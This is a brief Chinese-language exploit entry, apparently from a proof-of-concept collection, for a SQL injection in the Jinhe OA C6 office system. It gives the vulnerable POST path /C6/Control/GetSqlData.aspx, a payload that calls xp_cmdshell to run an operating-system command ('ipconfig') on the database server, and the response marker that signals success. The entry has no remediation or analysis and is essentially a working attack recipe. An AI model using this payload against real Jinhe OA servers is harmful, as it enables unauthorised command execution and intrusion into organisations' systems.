# 金和OAC6-GetSqlData.aspxSQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **请求**：`POST /C6/Control/GetSqlData.aspx/.ashx  HTTP/1.1`

**Payload**
```
exec master..xp_cmdshell 'ipconfig'
```
- **响应特征**：-1